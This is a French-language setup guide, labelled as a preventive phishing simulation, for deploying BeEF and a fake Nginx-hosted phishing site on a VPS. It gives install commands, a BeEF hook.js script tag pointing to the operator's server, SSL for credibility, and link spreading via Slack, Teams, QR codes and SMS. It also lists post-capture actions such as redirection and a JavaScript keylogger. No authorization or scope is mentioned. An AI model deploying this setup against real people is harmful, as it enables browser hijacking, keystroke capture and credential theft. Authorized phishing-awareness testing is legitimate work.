# 🚀 Framework Préventif Phishing/Scam (Sans Email)

## 🏗️ 1. Infrastructure

### Prérequis :
- VPS (OVH, Hetzner, Contabo, Scaleway)
  - Debian 12 ou Ubuntu 22.04 LTS
  - 2 vCPU, 4 Go RAM, 50 Go SSD
  - IP publique

## 🧰 2. Stack technique

| Composant       | Rôle                   |
|-----------------|------------------------|
| BeEF           | Capturer les victimes  |
| Nginx          | Héberger le faux site  |
| Let's Encrypt  | SSL pour crédibilité   |
| UFW / Fail2Ban | Sécurité minimale      |
| Nom de domaine | Rendre ça pro          |

## 🔨 3. Installation

### a) Mise à jour VPS :
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y git curl build-essential ruby ruby-dev nginx certbot python3-certbot-nginx ufw fail2ban
```

### b) Installation de BeEF :
```bash
git clone https://github.com/beefproject/beef.git
cd beef
bundle install
./beef
```
Accès : http://[IP_VPS]:3000/ui/panel (login : beef / beef)

### c) Faux site avec Nginx :

1. Crée le dossier :
```bash
sudo mkdir -p /var/www/fauxsite
sudo nano /var/www/fauxsite/index.html
```
2. Ajoute un template de phishing (exemple : [credphish/templates](https://github.com/credphish/templates)) avec :
```html
<script src="http://[IP_VPS]:3000/hook.js"></script>
```
3. Configuration Nginx :
```bash
sudo nano /etc/nginx/sites-available/fauxsite
```
Contenu :
```nginx
server {
    listen 80;
    server_name tonfauxsite.com;

    root /var/www/fauxsite;
    index index.html;

    location / {
        try_files $uri $uri/ =404;
    }
}
```
Activation :
```bash
sudo ln -s /etc/nginx/sites-available/fauxsite /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx
```

### d) SSL Let's Encrypt :
```bash
sudo certbot --nginx -d tonfauxsite.com
```

## 🛡️ 4. Sécurité VPS :
```bash
sudo ufw allow OpenSSH
sudo ufw allow 80,443,3000/tcp
sudo ufw enable
```
Fail2ban actif par défaut.

## 🎯 5. Diffusion du lien :
- Slack, Discord, Teams
- QR code imprimé
- SMS interne

## 📊 6. Suivi via BeEF :
- OS, navigateur, plugins
- IP et géolocalisation
- Actions : popup, redirection, keylogger JS

## 📁 7. Rapport final :
- Nombre de victimes
- Failles humaines détectées
- Recommandations : vigilance sur les liens, vérifier les URLs, méfiance même en interne

## 📌 Recap :

| ÉTAPE           | OUTIL       | OBJECTIF              |
|-----------------|-------------|-----------------------|
| VPS            | Hetzner     | Hébergement          |
| BeEF           | GitHub      | Capture & exploitation|
| Faux Site      | Nginx + HTML| Simulation phishing  |
| SSL            | Certbot     | Crédibilité https    |
| Sécurité       | UFW/Fail2ban| VPS protégé          |
| Diffusion lien | Slack/QR/etc| Remplacement des mails|
